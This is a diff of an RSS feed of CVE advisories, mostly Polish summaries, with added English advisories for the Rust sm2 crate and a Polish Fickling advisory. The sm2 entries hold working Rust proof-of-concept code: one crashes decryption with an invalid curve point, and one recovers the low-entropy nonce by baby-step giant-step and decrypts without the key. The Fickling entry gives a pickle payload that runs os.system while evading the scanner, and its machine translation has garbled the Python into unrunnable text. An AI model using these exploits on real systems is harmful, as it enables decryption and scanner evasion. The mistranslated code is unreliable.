@@ -1,5 +1,571 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-22584</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22584</link><pubDate>Fri, 09 Jan 2026 22:10:02 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa kontrola generowania kodu („wstrzykiwanie kodu”) w Salesforce Uni2TS w systemach MacOS, Windows i Linux umożliwia wykorzystanie kodu wykonywalnego w plikach niewykonywalnych. Ten problem dotyczy Uni2TS: do wersji 1.2.0.</description></item><item><title>CVE-2025-15500</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15500</link><pubDate>Fri, 09 Jan 2026 21:32:08 +0000</pubDate><description>W Sangfor Operation and Maintenance Management System do wersji 3.0.8 została odkryta luka.Ten problem dotyczy nieznanego przetwarzania pliku /isomp-protocol/protocol/getHis komponentu HTTP POST Request Handler.Manipulacja argumentem sessionPath powoduje wstrzyknięcie polecenia os.Atak może zostać przeprowadzony zdalnie.Exploit został upubliczniony i może zostać wykorzystany.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-22699</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22699</link><pubDate>Fri, 09 Jan 2026 22:35:35 +0000</pubDate><description>### Summary
+
+A denial-of-service vulnerability exists in the SM2 PKE decryption path where an invalid elliptic-curve point (C1) is decoded and the resulting value is unwrapped without checking. Specifically, `AffinePoint::from_encoded_point(&amp;encoded_c1)` may return a `None`/`CtOption::None` when the supplied coordinates are syntactically valid but do not lie on the SM2 curve. The calling code previously used `.unwrap()`, causing a panic when presented with such input.
+
+
+
+
+### Affected Component / Versions
+
+- File: `src/pke/decrypting.rs`
+
+- Function: internal `decrypt()` (invoked by `DecryptingKey::decrypt*` methods)
+
+- Affected releases: 
+
+  - sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)
+  - sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)
+
+  
+
+
+### Details
+
+The library decodes the C1 field (an EC point) as an `EncodedPoint` and then converts it to an `AffinePoint` using `AffinePoint::from_encoded_point(&amp;encoded_c1)`. That conversion returns a `CtOption&lt;AffinePoint&gt;` (or an `Option` equivalent) which will indicate failure when the coordinates do not satisfy the curve equation. The code then called `.unwrap()` on that result, causing a panic when
+`None` was returned. Because `EncodedPoint::from_bytes()` only validates format (length and SEC1
+encoding) and not mathematical validity, an attacker can craft `C1 = 0x04 || X || Y` with X and Y of the right length that nonetheless do not satisfy the curve. Such inputs will pass the format check but trigger `from_encoded_point()` failure and therefore panic on `.unwrap()`.
+
+
+
+
+### Proof of Concept (PoC)
+
+`examples/poc_der_invalid_point.rs` constructs an ASN.1 DER `Cipher` structure
+with `x` and `y` set to arbitrary 32-byte values (e.g., repeating 0x11 and 0x22),
+and passes it to `DecryptingKey::decrypt_der`. With the vulnerable code, this
+produces a panic originating at the `unwrap()` call in `decrypt()`. Other APIs such as `DecryptingKey::decrypt` also produce a panic with invalid C1 point.
+
+``` rust
+//! PoC: trigger invalid-point panic via `decrypt_der` by providing ASN.1 DER
+//! where x/y are valid-length integers but do not lie on the curve.
+//!
+//! Usage:
+//!   RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point
+
+use rand_core::OsRng;
+use sm2::SecretKey;
+use sm2::pke::DecryptingKey;
+
+fn build_der(x: &amp;[u8], y: &amp;[u8], digest: &amp;[u8], cipher: &amp;[u8]) -&gt; Vec&lt;u8&gt; {
+    // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }
+    let mut body = Vec::new();
+
+    // INTEGER x
+    body.push(0x02);
+    body.push(x.len() as u8);
+    body.extend_from_slice(x);
+
+    // INTEGER y
+    body.push(0x02);
+    body.push(y.len() as u8);
+    body.extend_from_slice(y);
+
+    // OCTET STRING digest
+    body.push(0x04);
+    body.push(digest.len() as u8);
+    body.extend_from_slice(digest);
+
+    // OCTET STRING cipher
+    body.push(0x04);
+    body.push(cipher.len() as u8);
+    body.extend_from_slice(cipher);
+
+    // SEQUENCE header
+    let mut der = Vec::new();
+    der.push(0x30);
+    der.push(body.len() as u8);
+    der.extend(body);
+    der
+}
+
+fn main() {
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng).expect("failed to generate secret key");
+    let dk = DecryptingKey::new(sk);
+
+    // x/y are 32-byte values that almost certainly are NOT on the curve
+    let x = [0x11u8; 32];
+    let y = [0x22u8; 32];
+    let digest = [0x33u8; 32];
+    let cipher = [0x44u8; 16];
+
+    let der = build_der(&amp;x, &amp;y, &amp;digest, &amp;cipher);
+
+    println!("Calling decrypt_der with DER (len={})...", der.len());
+
+    // Expected to panic in decrypt() when validating the point (from_encoded_point().unwrap())
+    let _ = dk.decrypt_der(&amp;der);
+
+    println!("decrypt_der returned (unexpected) - PoC did not panic");
+}
+
+```
+
+Run locally:
+
+```bash
+RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point --features std
+```
+
+The process will panic with a backtrace pointing to `src/pke/decrypting.rs` at the `from_encoded_point(...).unwrap()` call.
+
+
+
+
+### Impact
+
+- Denial of Service: an attacker who can submit ciphertext (or DER ciphertext)
+  can crash the decrypting thread/process.
+- Low attacker effort: crafting random 32-byte X/Y values that are not on the
+  curve is trivial.
+- Wide exposure: any service that accepts ciphertext and links this library is
+  vulnerable.
+
+
+### Recommended Fix
+
+Do not call `.unwrap()` on the result of `AffinePoint::from_encoded_point()`.
+Instead, convert the `CtOption` to an `Option` (or inspect it) and return a
+library `Err` for invalid points. Example minimal fix:
+
+```rust
+    // Return an error instead of panicking when the provided point is not on the curve.
+    let mut c1_point: AffinePoint = match AffinePoint::from_encoded_point(&amp;encoded_c1).into() {
+        Some(p) =&gt; p,
+        None =&gt; return Err(Error),
+    };
+```
+
+This ensures `decrypt()` returns a controlled error for invalid or malformed points instead of panicking.
+
+
+
+### **Credit**
+
+This vulnerability was discovered by:
+
+- XlabAI Team of Tencent Xuanwu Lab
+
+- Atuin Automated Vulnerability Discovery Engine
+
+CVE and credit are preferred.
+
+If developers have any questions regarding the vulnerability details, please feel free to reach for further discussion via email at xlabai@tencent.com.
+
+ 
+
+### **Note**
+
+This organization follows the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.</description></item><item><title>CVE-2025-15501</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15501</link><pubDate>Fri, 09 Jan 2026 22:32:05 +0000</pubDate><description>W systemie zarządzania eksploatacją i konserwacją Sangfor do wersji 3.0.8 wykryto lukę.Dotyczy to funkcji WriterHandle.getCmd w pliku /isomp-protocol/protocol/getCmd.Ta manipulacja argumentem sessionPath powoduje wstrzyknięcie polecenia os.Możliwe jest zdalne wykorzystanie ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
+
+CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2026-22612</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22612</link><pubDate>Fri, 09 Jan 2026 22:29:02 +0000</pubDate><description>Ocena #Ficklinga
+
+Fickling zaczął emitować węzły AST dla importu wbudowanych elementów, aby dopasować je podczas analizy (https://github.com/trailofbits/fickling/commit/9f309ab834797f280cb5143a2f6f987579fa7cdf).
+
+# Oryginalny raport
+
+### Podsumowanie
+Ficking działa według
+Kod bajtowy Pickle --&gt; AST --&gt; Analiza bezpieczeństwa
+Jednak podczas przechodzenia z kodu bajtowego do AST niektóre węzły importu są usuwane, co zaślepia analizę bezpieczeństwa
+
+fickle/fickle/fickle.py
+```pyton
+def run(self, interpreter: Interpreter):
+moduł, attr = self.module, self.attr
+jeśli moduł w („__builtin__”, „__builtins__”, „wbudowane”):
+# nie ma potrzeby emitowania importu dla wbudowanych!
+przejść
+inne:
+alias = ast.alias(attr)
+interpreter.module_body.append(ast.ImportFrom(moduł=moduł, nazwy=[alias], poziom=0))
+interpreter.stack.append(ast.Name(attr, ast.Load()))
+
+def encode(self) -&gt; bajty:
+return f"c{self.module}\n{self.attr}\n".encode()
+```
+Widzimy tutaj, że dla wbudowanych nie są emitowane żadne węzły importu
+Jednak import wbudowany jest oznaczony jako niebezpieczny
+
+fickling/fickling/analytics.py
+```pyton
+NIEBEZPIECZNE_MODUŁY = {
+"__builtin__": "Ten moduł zawiera niebezpieczne funkcje, które mogą wykonać dowolny kod.",
+"__builtins__": "Ten moduł zawiera niebezpieczne funkcje, które mogą wykonać dowolny kod.",
+"builtins": "Ten moduł zawiera niebezpieczne funkcje, które mogą wykonać dowolny kod.",
+```
+
+Ponieważ jednak nie ma węzłów importu dla wbudowanych elementów (nie zostały one wyemitowane podczas tworzenia AST), skaner bezpieczeństwa jest w rzeczywistości ślepy.
+
+Może to pozwolić na takie obejścia zabezpieczeń
+
+poc.py (skrypt do tworzenia ładunku)
+```pyton
+importuj os
+
+GLOBAL = b'c' # Importuj nazwę modułu
+ŁAŃCUCH = b'S' # Naciśnij ciąg
+TUPLE1 = b'\x85' # Zbuduj krotkę o wartości 1
+TUPLE2 = b'\x86' # Zbuduj krotkę składającą się z 2
+EMPTY_TUPLE = b')'
+REDUCE = b'R' # Wywołanie funkcji
+PUT = b'p' # Zapamiętaj (przypisanie zmiennej)
+GET = b'g' # Załaduj z notatki (zmienne użycie)
+POP = b'0' # Odrzuć górę stosu
+EMPTY_DICT = b'}'
+SETITEM = b's' # Dodaj klucz/wartość do dyktowania
+BUILD = b'b' # Aktualizuj stan obiektu (spełnia żywotność)
+STOP = b'.'# Zakończ i wróć na górę stosu
+
+def generuj_raw_ładunek():
+ładunek = b""
+
+ładunek += GLOBALNY + b"wbudowane\n__import__\n"
+ładunek += STRING + b"'os'\n"
+ładunek += TUPLE1 + REDUCE
+ładunek += PUT + b"0\n" # _var0 = moduł systemu operacyjnego
+ładunek += POP
+
+ładunek += GLOBALNY + b"wbudowane\ngetattr\n"
+ładunek += GET + b"0\n" # moduł systemu operacyjnego
+ładunek += STRING + b"'system'\n"
+ładunek += TUPLE2 + REDUCE
+ładunek += PUT + b"1\n" # _var1 = os.system
+ładunek += POP
+
+ładunek += GET + b"1\n" # os.system
+ładunek += ŁAŃCUCH + b"'whoami'\n" # POLECENIE
+ładunek += TUPLE1 + REDUCE
+ładunek += PUT + b"2\n"
+ładunek += POP
+
+ładunek += GLOBALNY + b"wbudowane\nWyjątek\n"
+ładunek += EMPTY_TUPLE + REDUCE
+ładunek += PUT + b"3\n"
+
+ładunek += EMPTY_DICT
+ładunek += STRING + b"''ce_status'\n"
+ładunek += GET + b"2\n"
+ładunek += SETITEM
+
+ładunek += BUDOWA
+
+ładunek += STOP
+
+ładunek zwrotny
+
+if __name__ == "__main__":
+dane = generuj_raw_ładunek()
+z open("raw_bypass.pkl", "wb") jako f:
+f.zapisz(dane)
+
+print("Wygenerowano 'raw_bypass.pkl'")
+```
+
+Tworzy to plik pickle, który importuje moduł systemu operacyjnego za pomocą __import__, który jest częścią wbudowanych.gdyby skaner bezpieczeństwa nie został oślepiony, zostałby natychmiast oznaczony.
+
+Jednak teraz Fickling postrzega ładunek marynaty jako
+
+```pyton
+_var0 = __import__('os')
+_var1 = getattr(_var0, 'system')
+_var2 = _var1('whoami')
+_var3 = wyjątek()
+_var4 = _var3
+_var4.__setstate__({'rce_status': _var2})
+wynik0 = _var4
+```
+
+&lt;img szerokość="810" wysokość="182" alt="image" src="https://github.com/user-attachments/assets/5bfe8c34-7bc0-429f-83ce-d0c2f1928aca" /&gt;
+
+
+Jak widać, nie ma nigdzie wzmianki o wbudowanych, więc nie jest to oznaczone
+
+Dodatkowo konstruktor ładunku wykorzystuje technikę zapewniającą, że żadna zmienna nie zostanie oznaczona jako „NIEUŻYWANA”.
+Oszukujemy heurystykę analizy przepływu danych, używając kodu operacji BUILD do aktualizacji stanu wewnętrznego obiektu.
+Biorąc wynik os.system (kod wyjścia) i używając go jako wartości w słowniku, który jest następnie „wbudowany” w zwrócony obiekt wyjątku, tworzymy logiczny łańcuch zależności.
+
+Efektem końcowym jest to, że złośliwa marynata zostaje sklasyfikowana jako LIKELY_SAFE
+
+Poprawki:
+Upewnij się, że obiekty importu są emitowane dla importów z wbudowanych funkcji, w zależności od tego, jaki jest ten import, powiedzmy emituj węzły importu dla niebezpiecznych funkcji, takich jak ```__import__```, nie emitując jednocześnie dla rzeczy takich jak ```dict()```</description></item><item><title>CVE-2026-22698</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22698</link><pubDate>Fri, 09 Jan 2026 22:27:50 +0000</pubDate><description>### Summary
+
+A critical vulnerability exists in the SM2 Public Key Encryption (PKE) implementation where the ephemeral nonce `k` is generated with severely reduced entropy. A unit mismatch error causes the nonce generation function to request only 32 bits of randomness instead of the expected 256 bits. This reduces the security of the encryption from a 128-bit level to a trivial 16-bit level, allowing a practical attack to recover the nonce `k` and decrypt any ciphertext **given only the public key and ciphertext**.
+
+
+
+### Affected Versions
+
+- sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)
+- sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)
+
+This vulnerability is introduced in commit: [Commit 4781762](https://github.com/RustCrypto/elliptic-curves/commit/4781762f23ff22ab34763410f648128055c93731) on Sep 6, 2024, which is over a year ago.
+
+
+
+### Details
+
+The root cause of this vulnerability is a unit mismatch in the `encrypt` function located in `sm2/src/pke/encrypting.rs`.
+
+1.  The code correctly calculates the byte-length of the curve order (256 bits / 8 = 32 bytes) and stores it in a constant `N_BYTES`.
+    ```rust
+    const N_BYTES: u32 = Sm2::ORDER.as_ref().bits().div_ceil(8); // Value is 32 (bytes)
+    ```
+2.  However, this `N_BYTES` value is then passed to the `next_k` helper function, which incorrectly interprets this value as a *bit length*.
+    ```rust
+    let k = Scalar::from_uint(&amp;next_k(rng, N_BYTES)?).unwrap();
+    ```
+3.  Inside `next_k`, the `bit_length` parameter (which holds the value 32) is passed directly to `U256::try_random_bits`, a function that generates a random number with the specified number of bits.
+    ```rust
+    fn next_k&lt;R: TryCryptoRng + ?Sized&gt;(rng: &amp;mut R, bit_length: u32) -&gt; Result&lt;U256&gt; {
+        let k = U256::try_random_bits(rng, bit_length).map_err(|_| Error)?;
+        // ...
+    }
+    ```
+    As a result, the ephemeral nonce `k` is generated with only 32 bits of entropy, with its upper 224 bits being zero. This catastrophic loss of randomness makes the encryption scheme insecure.
+    
+    
+
+### PoC
+
+A proof-of-concept demonstrating the feasibility of this attack is provided in `examples/bsgs_recover.rs`. The PoC performs the following steps:
+
+1.  **Encrypt a Message**: It uses the vulnerable `EncryptingKey::encrypt` function to encrypt a sample message.
+2.  **Extract Ephemeral Public Key**: It parses the ciphertext to extract `C1`, which is the ephemeral public key `[k]G`.
+3.  **Recover Nonce `k`**: It runs a Baby-Step Giant-Step (BSGS) algorithm to search the reduced 2^32 search space for the nonce `k`. This attack is computationally feasible on modern hardware in seconds with time complexity `O(2^16)`.
+4.  **Decrypt without Secret Key**: Once `k` is recovered, it computes the shared secret `[k]PB` (where `PB` is the recipient's public key) and successfully decrypts the ciphertext without access to the recipient's secret key.
+
+`examples/bsgs_recover.rs`
+
+``` rust
+//! Example: Recover low-entropy nonce k via Baby-Step Giant-Step (BSGS)
+//!
+//! This example intentionally demonstrates an attack on the vulnerable
+//! `EncryptingKey::encrypt` implementation which (in the current repository
+//! state) may generate k with only 32 bits of entropy. The example:
+//! - Generates a key pair and encrypts a short plaintext.
+//! - Extracts C1 from the ciphertext (ephemeral public key [k]G).
+//! - Runs BSGS over the reduced search space 2^32 to recover k and decrypt: time O(2^16), space O(2^16).
+//!
+
+use std::collections::HashMap;
+use std::error::Error;
+
+use rand_core::OsRng;
+
+use sm2::{
+    pke::Mode,
+    pke::EncryptingKey,
+    PublicKey,
+    SecretKey,
+    AffinePoint,
+    ProjectivePoint,
+    Scalar,
+};
+use elliptic_curve::bigint::U256;
+use elliptic_curve::{Group, Curve};
+use elliptic_curve::sec1::{FromEncodedPoint, ToEncodedPoint};
+use sm3::{Sm3, Digest};
+
+/// Baby-step giant-step over the 32-bit search space.
+fn bsgs_recover_k(c1: &amp;AffinePoint) -&gt; Option&lt;U256&gt; {
+    // search parameters
+    let m: u32 = 1 &lt;&lt; 16; // baby/giant step size -&gt; covers 2^32 space
+
+    // baby steps: j*G -&gt; j
+    let mut baby: HashMap&lt;Vec&lt;u8&gt;, u32&gt; = HashMap::with_capacity(m as usize + 1);
+    for j in 0..m {
+        let j_u256 = U256::from_u32(j);
+        let s = Scalar::from_uint(&amp;j_u256).unwrap();
+        let p = ProjectivePoint::mul_by_generator(&amp;s).to_affine();
+        let ep = p.to_encoded_point(false);
+        baby.insert(ep.as_bytes().to_vec(), j);
+    }
+
+    // giant steps
+    for i in 0..=m {
+        let im = (i as u64) * (m as u64);
+        let im_u256 = U256::from_u64(im);
+        let im_scalar = Scalar::from_uint(&amp;im_u256).unwrap();
+        let im_point = ProjectivePoint::mul_by_generator(&amp;im_scalar).to_affine();
+
+        // candidate = C1 - im_point
+        let c1_proj = ProjectivePoint::from(c1);
+        let im_proj = ProjectivePoint::from(&amp;im_point);
+        let candidate_proj = c1_proj + (-im_proj);
+        let candidate = candidate_proj.to_affine();
+        let cand_bytes = candidate.to_encoded_point(false).as_bytes().to_vec();
+
+        if let Some(&amp;j) = baby.get(&amp;cand_bytes) {
+            let k_recovered = im + (j as u64);
+            return Some(U256::from_u64(k_recovered));
+        }
+    }
+    None
+}
+
+/// KDF using SM3 (re-implementation of crate internal `kdf`).
+fn kdf_sm3(kpb: AffinePoint, c2: &amp;mut [u8]) {
+    let mut hasher = Sm3::new();
+    let klen = c2.len();
+    let mut ct: u32 = 0x00000001;
+    let digest_size = 32usize; // SM3 output is 32 bytes
+    let mut ha = vec![0u8; digest_size];
+    let encode_point = kpb.to_encoded_point(false);
+
+    let mut offset = 0usize;
+    while offset &lt; klen {
+        hasher.update(encode_point.x().unwrap());
+        hasher.update(encode_point.y().unwrap());
+        hasher.update(&amp;ct.to_be_bytes());
+        let out = hasher.finalize_reset();
+        ha.copy_from_slice(out.as_slice());
+
+        let xor_len = core::cmp::min(digest_size, klen - offset);
+        for i in 0..xor_len {
+            c2[offset + i] ^= ha[i];
+        }
+        offset += xor_len;
+        ct = ct.wrapping_add(1);
+    }
+}
+
+/// Decrypt ciphertext given recovered k and recipient public key (without secret key).
+fn decrypt_with_k(pubkey: &amp;PublicKey, k: U256, ciphertext: &amp;[u8], mode: Mode) -&gt; Result&lt;Vec&lt;u8&gt;, Box&lt;dyn Error&gt;&gt; {
+    // parse c1
+    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
+    let c1_len = n_bytes * 2 + 1;
+    if ciphertext.len() &lt; c1_len {
+        return Err("ciphertext too short".into());
+    }
+    let (_c1_bytes, rest) = ciphertext.split_at(c1_len);
+
+    // derive shared point hpb = [h*k]PB; for SM2 cofactor h == 1 so this is [k]PB
+    let pb_affine = pubkey.as_affine();
+    let k_scalar = Scalar::from_uint(&amp;k).unwrap();
+    let s = *pb_affine; // cofactor h == 1
+    let hpb = (s * k_scalar).to_affine();
+
+    // split rest into c2 and c3 depending on mode
+    let digest_size = 32usize; // SM3 output size
+    let (c2_slice, c3_slice) = match mode {
+        Mode::C1C2C3 =&gt; {
+            let c2_len = rest.len() - digest_size;
+            rest.split_at(c2_len)
+        }
+        Mode::C1C3C2 =&gt; {
+            let (c3, c2) = rest.split_at(digest_size);
+            (c2, c3)
+        }
+    };
+
+    let mut c2 = c2_slice.to_owned();
+    // KDF to recover plaintext
+    kdf_sm3(hpb, &amp;mut c2);
+
+    // verify c3
+    let mut check = Sm3::new();
+    let enc = hpb.to_encoded_point(false);
+    check.update(enc.x().unwrap());
+    check.update(&amp;c2);
+    check.update(enc.y().unwrap());
+    let out = check.finalize_reset();
+    if out.as_slice() != c3_slice {
+        return Err("c3 verification failed".into());
+    }
+
+    Ok(c2)
+}
+
+/// High-level: given ciphertext and recipient public key, recover k via BSGS and decrypt.
+fn recover_and_decrypt(pubkey: &amp;PublicKey, ciphertext: &amp;[u8], mode: Mode) -&gt; Result&lt;Vec&lt;u8&gt;, Box&lt;dyn Error&gt;&gt; {
+    // extract C1
+    let n_bytes = sm2::Sm2::ORDER.as_ref().bits().div_ceil(8) as usize; // 32
+    let c1_len = n_bytes * 2 + 1;
+    let (c1_bytes, _rest) = ciphertext.split_at(c1_len);
+    let encoded = sm2::EncodedPoint::from_bytes(c1_bytes)?;
+    let c1_affine = AffinePoint::from_encoded_point(&amp;encoded).unwrap();
+
+    if let Some(k) = bsgs_recover_k(&amp;c1_affine) {
+        println!("recovered k = 0x{:x}", k);
+        let plain = decrypt_with_k(pubkey, k, ciphertext, mode)?;
+        return Ok(plain);
+    }
+    Err("failed to recover k".into())
+}
+
+fn main() -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {
+    // demo: generate keypair, encrypt, then recover and decrypt without secret key
+    let mut rng = OsRng;
+    let sk = SecretKey::try_from_rng(&amp;mut rng)?;
+    let pk = sk.public_key();
+    let ek = EncryptingKey::new_with_mode(pk, Mode::C1C2C3);
+    let msg = b"attack-demo-sm2-bsgs-recover-example";
+    let ct = ek.encrypt(&amp;mut rng, msg)?;
+    print!("Trying to recover k and decrypt...\n");
+    let recovered = recover_and_decrypt(&amp;pk, &amp;ct, Mode::C1C2C3)?;
+    println!("recovered plaintext: {}", std::str::from_utf8(&amp;recovered)?);
+    Ok(())
+}
+
+```
+
+To run the PoC (tested on Apple M3): 
+
+```bash
+$ time cargo run --example bsgs_recover 
+Trying to recover k and decrypt...
+recovered k = 0x00000000000000000000000000000000000000000000000000000000ca4f2d79
+recovered plaintext: attack-demo-sm2-bsgs-recover-example
+cargo run --example bsgs_recover  14.44s user 0.13s system 89% cpu 16.266 total
+```
+
+
+
+### Impact
+
+This vulnerability leads to a complete loss of confidentiality for all data encrypted using the SM2 PKE implementation in this library. Any attacker who obtains a ciphertext can recover the plaintext in a feasible amount of time (several seconds).
+
+The severity is **Critical**, as it breaks the core security promise of the public key encryption scheme. All versions of the `sm2` crate with the vulnerable PKE implementation are affected. 
+
+- Fix 1: Modify the input parameter to the correct 256 bits
+
+  ``` rust
+  let k_uint = next_k(rng, N_BYTES * 8)?;
+  ```
+
+- Fix 2: We believe that the `next_k` function should only generate a 256-bit nonce to ensure security, therefore the parameter is unnecessary.
+
+  ``` rust
+  fn next_k&lt;R: TryCryptoRng + ?Sized&gt;(rng: &amp;mut R) -&gt; Result&lt;U256&gt; {
+      loop {
+          let k = U256::try_random_bits(rng, 256).map_err(|_| Error)?;
+          if !bool::from(k.is_zero()) &amp;&amp; k &lt; *Sm2::ORDER {
+              return Ok(k);
+          }
+      }
+  }
+  ```
+
+  
+
+### Credit
+
+This vulnerability was discovered by:
+
+- XlabAI Team of Tencent Xuanwu Lab
+- Atuin Automated Vulnerability Discovery Engine
+
+CVE and credit are preferred.
+
+If developers have any questions regarding the vulnerability details, please feel free to reach out for further discussion via email at  xlabai@tencent.com.
+
+
+
+### Note
+
+SM2 follows the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, the organization reserves the right to publicly disclose all information about the issues after this timeframe.</description></item><item><title>CVE-2026-22584</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22584</link><pubDate>Fri, 09 Jan 2026 22:10:02 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa kontrola generowania kodu („wstrzykiwanie kodu”) w Salesforce Uni2TS w systemach MacOS, Windows i Linux umożliwia wykorzystanie kodu wykonywalnego w plikach niewykonywalnych. Ten problem dotyczy Uni2TS: do wersji 1.2.0.</description></item><item><title>CVE-2025-15500</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15500</link><pubDate>Fri, 09 Jan 2026 21:32:08 +0000</pubDate><description>W Sangfor Operation and Maintenance Management System do wersji 3.0.8 została odkryta luka.Ten problem dotyczy nieznanego przetwarzania pliku /isomp-protocol/protocol/getHis komponentu HTTP POST Request Handler.Manipulacja argumentem sessionPath powoduje wstrzyknięcie polecenia os.Atak może zostać przeprowadzony zdalnie.Exploit został upubliczniony i może zostać wykorzystany.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
 
 CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2025-15499</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15499</link><pubDate>Fri, 09 Jan 2026 21:32:06 +0000</pubDate><description>W Sangfor Operation and Maintenance Management System do wersji 3.0.8 została odkryta luka.Podatnością dotknięta jest funkcja uploadCN pliku VersionController.java.Manipulacja nazwą pliku argumentu prowadzi do wstrzyknięcia polecenia os.Atak może zostać zainicjowany zdalnie.Exploit został ujawniony publicznie i może zostać wykorzystany.Skontaktowano się ze sprzedawcą w sprawie tego ujawnienia wcześniej, ale nie udzielił on żadnej odpowiedzi.
 
@@ -539,7 +1105,7 @@ CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2025-14886</title>
 
 CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2025-66315</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66315</link><pubDate>Fri, 09 Jan 2026 02:24:58 +0000</pubDate><description>W serwerze wersji produktów ZTE MF258K Pro występuje luka w konfiguracji.Z powodu nieprawidłowych ustawień uprawnień do katalogu osoba atakująca może wykonać uprawnienia do zapisu w określonym katalogu.
 
-CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2026-22710</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22710</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - rozszerzenie Wikibase umożliwia obsługę skryptów krzyżowych (XSS). Ten problem dotyczy Mediawiki - rozszerzenie Wikibase: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22712</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22712</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Niewłaściwe kodowanie lub ucieczka danych wyjściowych z powodu zamiany magicznych słów w luce ParserAfterTidy w Wikimedia Foundation Mediawiki - rozszerzenie ApprovedRevs umożliwia manipulację danymi wejściowymi. Ten problem dotyczy rozszerzenia Mediawiki - ApprovedRevs: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22713</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22713</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w rozszerzeniu Wikimedia Foundation Mediawiki - GrowthExperiments umożliwia obsługę skryptów Cross-Site Scripting (XSS). Ten problem dotyczy rozszerzenia Mediawiki - GrowthExperiments: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2025-67282</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67282</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z obejściem autoryzacji, które umożliwiają użytkownikowi o niskich uprawnieniach pobieranie skrótów haseł innego użytkownika, uzyskiwanie dostępu do elementów roboczych innego użytkownika, modyfikowanie ograniczonej zawartości w przepływach pracy, modyfikowanie logo aplikacji i manipulowanie profilem innego użytkownika.</description></item><item><title>CVE-2025-67281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67281</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach polegających na wstrzykiwaniu kodu SQL, które umożliwiają użytkownikowi o niskich uprawnieniach i uprawnieniach administratora dostęp do bazy danych i jej zawartości.</description></item><item><title>CVE-2025-67280</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67280</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z wstrzykiwaniem języka Hibernate Query Language, które umożliwiają użytkownikowi o niskim poziomie uprawnień wyodrębnianie haseł innych użytkowników i uzyskiwanie dostępu do wrażliwych danych innego 